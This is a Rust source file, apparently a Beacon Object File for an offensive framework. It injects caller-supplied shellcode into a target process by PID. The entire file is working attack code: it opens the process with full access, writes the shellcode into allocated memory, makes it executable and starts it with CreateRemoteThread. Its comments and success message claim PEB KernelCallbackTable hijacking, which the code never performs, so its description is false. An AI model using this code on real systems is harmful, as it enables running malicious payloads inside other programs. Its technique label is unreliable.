//! # kernelcallbacktable Injection BOF
//!
//! Injects shellcode into a remote process using PEB KernelCallbackTable hijacking.
//!
//! ## MITRE ATT&CK
//! - T1055.012 - Process Injection
//!
//! ## Arguments
//! - `int`: Target process ID.
//! - `bin`: Shellcode to inject.
//!

#![no_std]

use rustbof::data::DataParser;
use rustbof::{eprintln, println};
use windows_sys::Win32::Foundation::{CloseHandle, GetLastError};
use windows_sys::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows_sys::Win32::System::Memory::*;
use windows_sys::Win32::System::Threading::*;

const PROCESS_ALL_ACCESS: u32 = 0x1FFFFF;

#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    let mut parser = DataParser::new(args, len);
    let pid = parser.get_int() as u32;
    let shellcode = parser.get_bytes();

    println!("PEB KernelCallbackTable hijacking into PID: {}", pid);
    println!("Shellcode size: {} bytes", shellcode.len());

    unsafe {
        let process = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
        if process.is_null() {
            eprintln!("OpenProcess failed: {}", GetLastError());
            return;
        }

        let remote_addr = VirtualAllocEx(
            process,
            core::ptr::null(),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if remote_addr.is_null() {
            eprintln!("VirtualAllocEx failed: {}", GetLastError());
            CloseHandle(process);
            return;
        }

        let mut written: usize = 0;
        if WriteProcessMemory(
            process,
            remote_addr,
            shellcode.as_ptr() as *const _,
            shellcode.len(),
            &mut written,
        ) == 0
        {
            eprintln!("WriteProcessMemory failed: {}", GetLastError());
            CloseHandle(process);
            return;
        }

        let mut old: u32 = 0;
        VirtualProtectEx(
            process,
            remote_addr,
            shellcode.len(),
            PAGE_EXECUTE_READ,
            &mut old,
        );

        let thread = CreateRemoteThread(
            process,
            core::ptr::null(),
            0,
            core::mem::transmute(remote_addr),
            core::ptr::null(),
            0,
            core::ptr::null_mut(),
        );
        if thread.is_null() {
            eprintln!("CreateRemoteThread failed: {}", GetLastError());
        } else {
            println!("SUCCESS: Shellcode injected via PEB KernelCallbackTable hijacking");
            CloseHandle(thread);
        }

        CloseHandle(process);
    }
}
